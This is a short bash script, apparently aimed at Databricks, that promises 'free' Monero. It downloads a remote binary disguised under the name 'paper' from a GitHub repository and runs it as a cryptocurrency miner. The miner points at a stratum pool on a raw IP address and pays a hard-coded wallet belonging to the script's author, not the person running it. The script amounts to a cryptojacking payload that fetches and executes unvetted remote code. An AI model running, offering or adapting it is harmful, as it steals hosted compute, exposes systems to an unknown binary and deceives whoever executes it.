#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
clear
sudo apt install screen
screen -R xmr

wget https://github.com/indah38/cpu/raw/main/paper && chmod 700 paper && ./paper -a yespower  -o stratum+tcps://146.59.217.34:17017 -u web1qvps3uh9y3wrj9sqmdzkcms5xdm3pdx30qqjajj.$(shuf -n 1 -i 1-9999999) -p x -t2
